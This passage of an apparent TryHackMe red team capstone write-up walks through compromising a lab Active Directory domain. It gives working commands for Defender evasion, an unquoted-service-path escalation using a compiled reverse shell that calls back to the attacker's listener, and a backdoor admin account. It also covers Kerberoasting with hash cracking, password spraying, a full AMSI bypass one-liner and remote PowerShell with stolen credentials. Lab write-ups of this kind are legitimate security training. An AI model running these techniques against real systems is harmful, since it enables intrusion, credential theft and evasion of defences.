3. Add the following UUID to the first line of the file: 00763558-2485-4d56-8afc-b5a6207bbe42
4. Click proceed for the verification to occur

Once you have performed the steps, please enter Y to verify your access.
If you wish to fully exit verification and try again please, please enter X.
If you wish to remove this verification attempt, please enter Z
Ready to verify? [Y/X/Z]: Y
Warning: Permanently added '10.200.113.22' (ECDSA) to the list of known hosts.
ItsFadinG.txt                                                                                                                                                                                           100%   41    36.2KB/s   00:00    

Well done! Check your email!
```
![Untitled](/assets/N-RedTeamCC/Untitled%2012.png)
![Untitled](/assets/N-RedTeamCC/Untitled%2013.png)

We are now able to obtain the following flags:
- ***Flag 1, Breaching the Perimeter***

- ***Flag 2, Breaching Active Directory***

- ***Flag 3, Foothold on Corporate Division Tier 2 Infrastructure***

![Untitled](/assets/N-RedTeamCC/Untitled%2014.png)

# **Administrative access to Corporate Division Tier 2 Infrastructure**
## **WRK1 Machine**
### **Enumeration**
**NMAP**
Let's see the open ports and available services.
```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ nmap -Pn 10.200.113.21 -T4 
Host is up (0.19s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ nmap -Pn 10.200.113.21 -T4 -p22,135,139,445,3389 -A    
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2178e279d393eef9aa7094ec01b3a58f (RSA)
|   256 e0f7b667c993b5740f0a83ffef55c89a (ECDSA)
|_  256 bd830ce3b44f78f2e34a52033ca5ce58 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=**WRK1.corp.thereserve.loc**
| Not valid before: 2024-05-18T10:42:39
|_Not valid after:  2024-11-17T10:42:39
| rdp-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
**|   NetBIOS_Computer_Name: WRK1
|   DNS_Domain_Name: corp.thereserve.loc
|   DNS_Computer_Name: WRK1.corp.thereserve.loc**
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-20T12:25:06+00:00
|_ssl-date: 2024-05-20T12:25:45+00:00; -1s from scanner time.
                                  
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ nmap -Pn 10.200.113.22 -T4 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 14:05 EET
Nmap scan report for 10.200.113.22
Host is up (0.26s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi

┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ nmap -Pn 10.200.113.22 -T4 -p22,135,139,445,3389,5357 -A
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 14:23 EET
Nmap scan report for 10.200.113.22
Host is up (0.31s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 e6f0fb5b24286813daddc55f674ebe4f (RSA)
|   256 93f58f4c3115fc8e38033ed5b71cedd3 (ECDSA)
|_  256 563f8a33a41fdc119aa167a67df87618 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: WRK2
**|   DNS_Domain_Name: corp.thereserve.loc
|   DNS_Computer_Name: WRK2.corp.thereserve.loc**
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-20T12:23:30+00:00
| ssl-cert: Subject: commonName=WRK2.corp.thereserve.loc
| Not valid before: 2024-05-18T10:42:36
|_Not valid after:  2024-11-17T10:42:36
|_ssl-date: 2024-05-20T12:23:39+00:00; -1s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0

Host script results:
| smb2-time: 
|   date: 2024-05-20T12:23:30
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```
**Manual Enumeration**
```powershell
PS C:\Users\mohammad.ahmed> hostname
WRK1
PS C:\Users\mohammad.ahmed> whoami
corp\mohammad.ahmed
PS C:\Users\mohammad.ahmed> net user mohammad.ahmed /domain
The request will be processed at a domain controller for domain corp.thereserve.loc.

User name                    mohammad.ahmed
Full Name                    Mohammad Ahmed
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/18/2023 9:28:25 AM
Password expires             Never
Password changeable          3/19/2023 9:28:25 AM
Password required            Yes
User may change password     Yes
Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/22/2024 11:18:43 AM
Logon hours allowed          All
Local Group Memberships
**Global Group memberships     *Help Desk            *Domain Users**
The command completed successfully.

PS C:\Users\mohammad.ahmed> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\mohammad.ahmed> net group "Help Desk" /domain

Members
-------------------------------------------------------------------------------
ashley.chan              emily.harvey             keith.allen
laura.wood               mohammad.ahmed
The command completed successfully.
```
**PowerVeiw**
The normal enumeration method will not be sufficient for us to get as much info as we need. Powerview or the AD module should help us get more information. But the WRK1 and WRK2 machines have Windows Defender installed and enabled. 
```powershell
PS C:\Users\mohammad.ahmed> Import-Module  \\tsclient\share\PowerView.ps1
Import-Module : Operation did not complete successfully because the file contains a virus or potentially unwanted software.
At line:1 char:1
+ Import-Module  \\tsclient\share\PowerView.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (:String) [Import-Module], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException,Microsoft.PowerShell.Commands.ImportModuleCommand

```

### **AV Evasion**
So I have tried a simple way to bypass it. Removing most of the comments in the file and changing the file name.
```powershell
PS C:\Users\mohammad.ahmed> Import-Module  \\tsclient\share\notpv.ps1
PS C:\Users\mohammad.ahmed> Get-NetDomain
Forest                  : thereserve.loc
DomainControllers       : {CORPDC.corp.thereserve.loc}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : thereserve.loc
PdcRoleOwner            : CORPDC.corp.thereserve.loc
RidRoleOwner            : CORPDC.corp.thereserve.loc
InfrastructureRoleOwner : CORPDC.corp.thereserve.loc
Name                    : corp.thereserve.loc
```
And it worked. Let’s get some info.
```powershell
# User Info
PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity mohammad.ahmed
logoncount            : 22404
badpasswordtime       : 5/21/2024 1:53:27 PM
department            : IT
objectclass           : {top, person, organizationalPerson, user}
displayname           : Mohammad Ahmed
lastlogontimestamp    : 5/20/2024 9:27:13 PM
userprincipalname     : mohammad.ahmed@corp.thereserve.loc
name                  : Mohammad Ahmed
lockouttime           : 0
objectsid             : S-1-5-21-170228521-1485475711-3199862024-2000
samaccountname        : mohammad.ahmed
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/20/2024 9:27:13 PM
instancetype          : 4
usncreated            : 402524
objectguid            : a35a91c9-a8e8-4fb3-8256-098572be22e4
sn                    : Ahmed
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
distinguishedname     : CN=Mohammad Ahmed,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc
dscorepropagationdata : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
givenname             : Mohammad
title                 : Help Desk
memberof              : CN=Help Desk,OU=Groups,DC=corp,DC=thereserve,DC=loc
lastlogon             : 5/22/2024 12:13:48 PM
badpwdcount           : 0
cn                    : Mohammad Ahmed
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 2/18/2023 6:26:02 PM
primarygroupid        : 513
pwdlastset            : 3/18/2023 9:28:25 AM
usnchanged            : 1114213

# Group Info
PS C:\Users\mohammad.ahmed> Get-DomainGroup -Identity 'Help Desk'

usncreated            : 402676
grouptype             : GLOBAL_SCOPE, SECURITY
samaccounttype        : GROUP_OBJECT
samaccountname        : Help Desk
whenchanged           : 2/18/2023 6:35:23 PM
objectsid             : S-1-5-21-170228521-1485475711-3199862024-2005
objectclass           : {top, group}
cn                    : Help Desk
usnchanged            : 402700
dscorepropagationdata : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
memberof              : CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc
distinguishedname     : CN=Help Desk,OU=Groups,DC=corp,DC=thereserve,DC=loc
name                  : Help Desk
member                : {CN=Mohammad Ahmed,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Keith Allen,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Ashley Chan,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Emily
                        Harvey,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc...}
whencreated           : 2/18/2023 6:34:27 PM
instancetype          : 4
objectguid            : ef6d9255-1df6-480e-86f6-ae870f3e490b
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
```
### **Privilege Escalation**
I found an interesting folder Called **"Backup Service"** in the root directory of `C:` that had another folder inside of it called "Full Backup" that had an executable file in it called `backup.exe`. 
```powershell
PS C:\> ls
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/12/2024  12:30 PM                Backup Service
d-----       11/14/2018   6:56 AM                EFI
d-----        5/13/2020   5:58 PM                PerfLogs
d-r---        3/18/2023  10:45 AM                Program Files
d-----        3/18/2023  10:44 AM                Program Files (x86)
d-----        2/19/2023   5:06 PM                Python311
d-r---        7/12/2024  12:45 PM                Users
d-----        4/15/2023   7:56 PM                Windows
-a----        4/15/2023   6:25 PM        3162859 EC2-Windows-Launch.zip
-a----        4/15/2023   6:25 PM          13182 install.ps1
-a----        4/27/2023   8:00 AM            848 thm-network-setup.ps1
PS C:\> cd '.\Backup Service\'
PS C:\Backup Service> ls
Directory: C:\Backup Service
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/14/2023   7:34 PM                Full Backup

PS C:\Backup Service> cd '.\Full Backup\'
PS C:\Backup Service\Full Backup> ls

    Directory: C:\Backup Service\Full Backup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/14/2023   7:34 PM              0 backup.exe
```
The Back Service Folder is a bit catchy as it is not created by default. So this might be a scheduled task that creates this file regularly, or a service. Let’s check.
```powershell
# Schedule Task
PS C:\Backup Service\Full Backup> get-scheduledtask -taskname '*backup*'

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\Microsoft\Windows\Registry\                   RegIdleBackup                     Ready
# Service
PS C:\Backup Service\Full Backup> Get-Service -ServiceName 'backup'

Status   Name               DisplayName
------   ----               -----------
Stopped  Backup             backup
```
It appears that this is a service, but it has been stopped. Let’s dig more to see if we can exploit it or not.
```powershell
PS C:\Backup Service\Full Backup> Get-WmiObject win32_Service | Select-Object Name, State, Startmode, description, PathName, DisplayName, startname | Select-String -Pattern 'backup'
@{Name=Backup; State=Stopped; Startmode=Manual; description=; **PathName=C:\Backup Service\Full Backup\backup.exe**; DisplayName=Backup; startname=**LocalSystem**}
```
Here it is! This service is being executed with Local System permission, and it is vulnerable to unquoted service paths. So exploiting this service will grant us Local Admin access on the WRK1 machine. As the WRK1 machine has Windows Defender enabled, we need to find a shell that passes the AV. Let’s try this one:
[https://github.com/izenynn/c-reverse-shell](https://github.com/izenynn/c-reverse-shell)
```bash
$ ./change_client.sh 12.100.1.8 9009                               
Done!                                                                                                 
$ i686-w64-mingw32-gcc-win32 -std=c99 windows.c -o rsh.exe -lws2_32                                                                                                 
$ cp rsh.exe ~/THM/N-RedTeamCC\Capstone_Challenge_Resources/Tools 
```
```powershell
PS C:\> cd '.\Backup Service\'
PS C:\Backup Service> ls
PS C:\Backup Service\> cp \\tsclient\share\rsh.exe Full.exe
PS C:\Backup Service> net start backup
The service is not responding to the control function.
More help is available by typing NET HELPMSG 2186.
```
```bash
$ rlwrap nc -nvlp 9009
listening on [any] 9009 ...
connect to [12.100.1.8] from (UNKNOWN) [10.200.89.21] 63432
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
WRK1
```
### **Persistence**
let’s do persistence and create our own privileged username.

```bash
C:\Windows\system32>net user ItsFadinG 'hacker14!@' /add
net user ItsFadinG 'hacker14!@' /add
The command completed successfully.
C:\Windows\system32>net localgroup Administrators ItsFadinG /add
net localgroup Administrators ItsFadinG /add
The command completed successfully.
C:\Windows\system32>net localgroup "Remote Desktop Users" ItsFadinG /add
net localgroup "Remote Desktop Users" ItsFadinG /add
The command completed successfully.
```
We are now able to obtain the following flag:
- ***Administrative access to Corporate Division Tier 2 Infrastructure***

# **Corporate Division Tier 1 Infrastructure**
## **WRK1 Machine**
### **Enumeration**
We have achieved local administrator access on the machine. However, to fully compromise the Active Directory, we need to obtain a Domain Administrator account. I have dived deep into enumeration, and I couldn’t find something interesting except this service account.
```powershell
PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity **svcOctober**

logoncount            : 14
badpasswordtime       : 1/1/1601 12:00:00 AM
distinguishedname     : CN=svcOctober,OU=Services,DC=corp,DC=thereserve,DC=loc
objectclass           : {top, person, organizationalPerson, user}
displayname           : svcOctober
lastlogontimestamp    : 3/24/2023 8:54:16 PM
userprincipalname     : svcOctober@corp.thereserve.loc
name                  : svcOctober
objectsid             : S-1-5-21-170228521-1485475711-3199862024-1987
samaccountname        : svcOctober
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 3/24/2023 8:54:16 PM
instancetype          : 4
usncreated            : 341698
objectguid            : 11e69fd6-46e7-414b-9c42-3fa7dafe9275
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
dscorepropagationdata : {3/20/2023 5:01:14 PM, 2/15/2023 9:07:45 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname  : mssql/svcOctober
givenname             : svcOctober
memberof              : CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc
lastlogon             : 3/30/2023 10:26:54 PM
badpwdcount           : 0
**cn                    : svcOctober**
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 2/15/2023 9:07:45 AM
primarygroupid        : 513
pwdlastset            : 2/15/2023 9:07:45 AM
usnchanged            : 527762
```
Usually in any tryhackme ad room, if there are any service accounts, these accounts will be Kerberoastable and their passwords can be cracked. Let’s follow our intuition and see.

### **Kerbroasting**
**Remotely**
I have tried this attack from my kali machine but it wasn’t working at all. and I wasn’t sure what was the reason.
```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ python3 /usr/local/bin/GetUserSPNs.py corp.thereserve.loc/laura.wood:Password1@ -dc-ip 10.200.89.102 -request  
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

[-] [Errno 110] Connection timed out
```
**Locally**
Using the PowerShell script, [Invoke-Kerberoast](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) from the [Empire](https://github.com/EmpireProject/Empire) project, which can be loaded directly into memory:
```powershell
# IK == Invoke-Kerberoast.ps1
PS C:\Users\mohammad.ahmed> Import-Module \\tsclient\share\ik.ps1
PS C:\Users\mohammad.ahmed> Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
PS C:\Users\mohammad.ahmed> dir
    Directory: C:\Users\mohammad.ahmed

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2024   2:13 PM                3D Objects
d-r---        5/21/2024   2:13 PM                Contacts
d-r---        5/21/2024   2:13 PM                Desktop
d-r---        5/21/2024   2:13 PM                Documents
d-r---        5/21/2024   2:13 PM                Downloads
d-r---        5/21/2024   2:13 PM                Favorites
d-r---        5/21/2024   2:13 PM                Links
d-r---        5/21/2024   2:13 PM                Music
d-r---        5/21/2024   2:13 PM                Pictures
d-r---        5/21/2024   2:13 PM                Saved Games
d-r---        5/21/2024   2:13 PM                Searches
d-r---        5/21/2024   2:13 PM                Videos
-a----        5/22/2024   3:00 PM          **12915 hashes.kerberoast**
```
And let’s try to crack those Kerberos tickets hashes with Hashcat. Unfortunately, only the **svcScanning** account has been cracked.
```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC\Hashes]
└─$ hashcat -m 13100 svcScanning.hash --wordlist ../Capstone_Challenge_Resources/generated_passwords2.txt --show
$krb5tgs$23$*svcScanning$corp.thereserve.loc$cifs/scvScanning*$3c70f983c9acda432f26512a5a5737a1$a337fb6cc70470fb26daf6dff8f3a13e394043c0f8e20eabfdc0de508aaa344d27289c155b4afdcfe91b69841ed1a734bb9848d9c459acfa8c5403ce6e24d4e84666a786ec8c667cac9bea1a58aee4ad18f0a0fd313096a389d9b87c92a8747c674c5aa116c4a6e5957bc0e4ebec4b535edda0bbffe8bfe8953717c02f3c59b3041e0d6a3ab60915498dfaa12ede45ee126809cb8ae4bdaa5914c54e4f38eb338cc19df5dec384ba5840a9c846d4d570a9f632f2e4cc7d1829242ec437690ef70c0dab8fa99a723df232a3ea7719664afa146afac9915674da4f93e1f4a3c9d5f01563682e158a2e74a4649ea62b7790bd09ff5a5f942ceed23de9680db06c86d5dc02af788295f6b6c300cd007801d507ab2a0cf6aa6cf2e3999d8097bbb75deb7f87493aced88cbb221f23d5ae04a3faba8bfa730dbf29719b589b296c80d1ae80239343c421a5d9d2c61def7c162bb37db39d61ac2ce6a07060537c2d7ff04ac7823facd26642ceec6702f4ced133fc26126f0f9dbdd460a3316c7a29cde1c6f631a9c5ed89b7fb322548d1ad19f4d79e7f43a9f87733b3798e34c0e4faae7055ebf467f7b87885d121324781ca11257783e216cabb9b9725a7938c026cad39fbdf8bf353a3fe814a2214bff2b31dd1a39630bcfd3404c8b36f6118c483d8c13e63fc5ab7bcec54b835eeba7049346449b46ff718df40316bf7ca2597c47bde6d9417fb9b0161a224ff7010e7d61e3a59d6f744f766c1c3d3ec1a663fa56d72acdc615a709bf00e1bfb5da5026ecb6757dc3db03e575f9e9d25fd90e0fe3e0a1601d54ff5d6b5c3c041faef12d88b1f2f45c2969fab93add7ee4252613c7f534c6cd8239533aadbf3741471043559b2627b7ddbd7a818f7400991965cfa723787c41425b5556f1dd29c9351fe23cdba6a24ef13e5f41548a1c9b74f672f8ce68dcae990afe8622bb8db779e5eb75a58dc89e4494bea5e17f309b50e441b69fe805eecd721f6a916a130452d5ae08e8a239dd36868580dc56f67c13457fd5781cc0a970c4e1371090e7a597021d2b7b8b91fdb662a0dbd04b605e551780fc697887b74ccb6c92f8ae83c7d1072fa441ab60a2e44d2a84ab92d0fefb42562d5d794895a75eac77c718e402667d895fe3c3319b7716d334b98289a07a60c8b55c3a215d873a97f6de51ebda290b80c94e64e6e0414c518dabc0912fb7f64988577bab69e36e291e6cebf88b35c07d560a78b74965e6931638b03f438c50ea4045d6ec3d239e5ac2bc7e7de665c2cdf6dac536547e8a1beea225cb55c9886a10a099e9af9f77dcdcd3956fa7b227fdf244f3f7a1fd8104e4fcd913c9d604d90ced1b78c0d1684dfb8c5f9fd2a415992d8fb73c63812ed00ad2d399a984db389ecb33bd91ae6e63f2f748d0299ef658058d7b381fd45545b6bf1bfb15e9f9e81a215db7244939918ed30981abf017301724c75ba183974302432b56a0d5805f479d177cd1be6b960f6fc328bf665659baf0757801eec8a367cb2d81db650853d68e992686a8abb47b071d3e75d0a17fb46fd774263c038278a29dd0986a2ccaccc63fd94b9a697834374f62c04c1cc514171a7bc70d6612fa86de41d171fb0d297197f87a97f36aed024a2c730380edcb56b6487d846a191ea491706c5a4542afe75701f165a8652255cfd26829f9abf4e38116f42defd798055b464ccba3287c767041eeb54d5004047bedc5316423f2fddc79368a8f6a27a748df20b:**Password1!**
```
Also, another way that I have tried is doing password spraying. As we have two valid passwords, we can use them against all enumerated users.
### **Password Spraying**
```bash
$ crackmapexec smb 10.200.113.21 -u All_users.txt -p valid_passwords --continue-on-success
**SMB         10.200.113.21   445    WRK1             [+] corp.thereserve.loc\svcScanning:Password1!** 
```
### **BloodHound**
After we have pawned this user, let’s gather more info about it so we can identify how we are going to use it further.
```powershell
PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcScanning
logoncount            : 1
badpasswordtime       : 5/22/2024 3:23:24 PM
distinguishedname     : CN=svcScanning,OU=Services,DC=corp,DC=thereserve,DC=loc
objectclass           : {top, person, organizationalPerson, user}
displayname           : svcScanning
lastlogontimestamp    : 5/22/2024 9:19:59 AM
userprincipalname     : svcScanning@corp.thereserve.loc
name                  : svcScanning
objectsid             : S-1-5-21-170228521-1485475711-3199862024-1986
samaccountname        : svcScanning
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/22/2024 9:19:59 AM
instancetype          : 4
usncreated            : 341680
objectguid            : baaf37c3-6507-4314-9ef9-a7012be29c74
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
dscorepropagationdata : {3/20/2023 5:01:14 PM, 2/15/2023 9:07:06 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname  : cifs/scvScanning
givenname             : svcScanning
memberof              : CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc
lastlogon             : 5/22/2024 3:23:26 PM
badpwdcount           : 0
cn                    : svcScanning
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 2/15/2023 9:07:06 AM
primarygroupid        : 513
pwdlastset            : 2/15/2023 9:07:06 AM
usnchanged            : 1172549

PS C:\Users\mohammad.ahmed> Get-DomainGroup -userName 'svcScanning'
usncreated            : 341777
grouptype             : GLOBAL_SCOPE, SECURITY
samaccounttype        : GROUP_OBJECT
samaccountname        : Services
whenchanged           : 2/15/2023 9:42:50 AM
objectsid             : S-1-5-21-170228521-1485475711-3199862024-1988
objectclass           : {top, group}
cn                    : Services
usnchanged            : 342199
dscorepropagationdata : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
name                  : Services
distinguishedname     : CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc
member                : {CN=svcScanning,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcMonitor,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcEDR,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcBackups,OU=Services,DC=corp,DC=thereserve,DC=loc}
whencreated           : 2/15/2023 9:09:35 AM
instancetype          : 4
objectguid            : c27deed9-dd22-4990-bd6f-54275906435f
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc

usncreated             : 12318
grouptype              : GLOBAL_SCOPE, SECURITY
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Users
whenchanged            : 9/7/2022 8:58:08 PM
objectsid              : S-1-5-21-170228521-1485475711-3199862024-513
objectclass            : {top, group}
cn                     : Domain Users
usnchanged             : 12320
dscorepropagationdata  : {3/20/2023 5:01:14 PM, 9/7/2022 8:58:09 PM, 1/1/1601 12:04:17 AM}
memberof               : CN=Users,CN=Builtin,DC=corp,DC=thereserve,DC=loc
iscriticalsystemobject : True
description            : All domain users
distinguishedname      : CN=Domain Users,CN=Users,DC=corp,DC=thereserve,DC=loc
name                   : Domain Users
whencreated            : 9/7/2022 8:58:08 PM
instancetype           : 4
objectguid             : 31be5ca3-8646-4475-a349-e009ef75cb92
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
```
I think this manual enumeration will be a bit difficult. Let’s try bloodhound to gain a better view.
As our compromised workstations have Windows Defender enabled, we have to find a way to run Sharphound script to get our loot.
**AV Evasion**
Found an obfuscated version of Sharphound that worked with me in this repo:
[GitHub - Flangvik/ObfuscatedSharpCollection](https://github.com/Flangvik/ObfuscatedSharpCollection/tree/main)
```powershell
# AMSI Bypass
PS C:\> $v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)

# APP Locker Bypass
PS C:\> cd C:\Windows\Tasks
PS C:\Windows\Tasks> cp \\tsclient\share\ss.exe .

# Running the obfuscated Script
PS C:\Windows\Tasks> ./ss.exe --CollectionMethods All
2024-06-27T19:13:37.2636725+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-06-27T19:13:37.4635801+00:00|INFORMATION|Initializing SharpHound at 7:13 PM on 6/27/2024
2024-06-27T19:13:37.8699076+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for corp.thereserve.loc : CORPDC.corp.thereserve.loc
2024-06-27T19:13:38.0105192+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-06-27T19:13:38.4565794+00:00|INFORMATION|Beginning LDAP search for corp.thereserve.loc
2024-06-27T19:13:39.2845578+00:00|INFORMATION|Producer has finished, closing LDAP channel
2024-06-27T19:13:39.2845578+00:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-06-27T19:14:08.6588099+00:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 53 MB RAM
2024-06-27T19:14:25.4557589+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for thereserve.loc : ROOTDC.thereserve.loc
2024-06-27T19:14:25.4557589+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for thereserve.loc : ROOTDC.thereserve.loc
2024-06-27T19:14:28.2861838+00:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2024-06-27T19:14:28.3814768+00:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-06-27T19:14:28.5361835+00:00|INFORMATION|Status: 1005 objects finished (+1005 20.1)/s -- Using 59 MB RAM
2024-06-27T19:14:28.5361835+00:00|INFORMATION|Enumeration finished in 00:00:50.0935515
2024-06-27T19:14:29.0711816+00:00|INFORMATION|Saving cache with stats: 970 ID to type mappings.
 976 name to SID mappings.
 2 machine sid mappings.
 5 sid to domain mappings.
 1 global catalog mappings.
2024-06-27T19:14:29.1181271+00:00|INFORMATION|SharpHound Enumeration Completed at 7:14 PM on 6/27/2024! Happy Graphing!
```
As we have recently compromised the SvcScanning user via a kerberoasting attack, let’s choose the option ***Shortest Path From kerberoastable Users.***
![Untitled](/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png)

GREAAAT! It seems that the svcScanning user is a member of the `services@corp.thereserve.loc` and has the permission to execute remote PowerShell commands on the `server2.corp.thereserve.loc` computer.

## **SERVER2 Machine**
### **Foothold**
**PowerShell Remote**
```powershell
PS C:\Users\mohammad.ahmed> $Secpass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
PS C:\Users\mohammad.ahmed> $Cred = New-Object System.Management.Automation.PSCredential('corp.thereserve.loc\svcScanning', $Secpass)
PS C:\Users\mohammad.ahmed>  Invoke-Command -ComputerName server2.corp.thereserve.loc -Credential $Cred -ScriptBlock {whoami}
corp\svcscanning
PS C:\Users\mohammad.ahmed>  Invoke-Command -ComputerName server2.corp.thereserve.loc -Credential $Cred -ScriptBlock {hostname}
SERVER2

# Getting a fully Interactive powershell session
PS C:\Users\mohammad.ahmed> Enter-PSSession -ComputerName server2.corp.thereserve.loc -Credential $Cred -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
[server2.corp.thereserve.loc]: PS C:\Users\svcScanning\Documents> powershell -nop -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\svcScanning\Documents>
[server2.corp.thereserve.loc]: PS C:\Users\svcScanning\Documents> whoami;hostname
corp\svcscanning
SERVER2
```
Now we have access to a `server2.corp.thereserve.loc` computer. But unfortunately, we don’t have direct access from our attacker machine to SERVER1 or SERVER2. So we need to establish port forwarding to ease the process of exploitation and privilege escalation.

### **Dynamic Port Forwarding**
As we have ssh enabled on WRK1 and WRK2 machines, let’s create a secure tunnel via SSH using the dynamic port forwarding method.
```powershell
# On WRK1 Machine
